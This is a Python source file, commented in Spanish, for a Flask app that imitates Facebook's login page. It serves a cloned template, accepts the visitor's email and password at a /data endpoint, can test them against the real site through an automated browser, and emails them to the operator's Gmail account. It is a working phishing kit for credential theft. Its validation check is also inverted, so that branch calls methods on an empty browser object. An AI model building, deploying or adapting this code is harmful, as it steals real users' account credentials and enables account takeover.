from ..functions import zip_template, send_mail
from flask import Flask, render_template, request
from pathlib import Path
from os.path import join as join_path

class Facebook():
    def __init__(self, navegador, my_info:dict, template_folder:str=None) -> None:
        """
        Crea una simulacion de la pagina de Facebook 

        :navegador -> un objeto de tipo Browser  
        :my_info -> diccionario con información de correo electronico. Ejemplo
            {
                "email": "tu_email@gmail.com",
                "application_password": "tu_clave_de_aplicacion"
            }
        :template_folder -> directorio donde se encuentran los templates a renderizar
        """
        self.navegador = navegador
        self.my_info = my_info
        folder = template_folder if template_folder else join_path(Path(__file__).parent.absolute(), "templates")
        self.app = Flask(__name__, template_folder = folder)
    
    def start(self):
        """Pone en marcha la pagina"""
        @self.app.route("/")
        def main():
            template = render_template("fb.html")
            return zip_template(template, self.app.template_folder)

        @self.app.post("/data")
        def data():
            req: dict = request.get_json()
            if not self.navegador:
                info = self.navegador.init().FB(self.navegador.driver).acces(req)
                if info: 
                    return {"status": 400, "error": info, "field": "pass" if "password" in info else "mail"}
            req.update(self.my_info)
            send_mail(**req)
            return {"status": "ok"}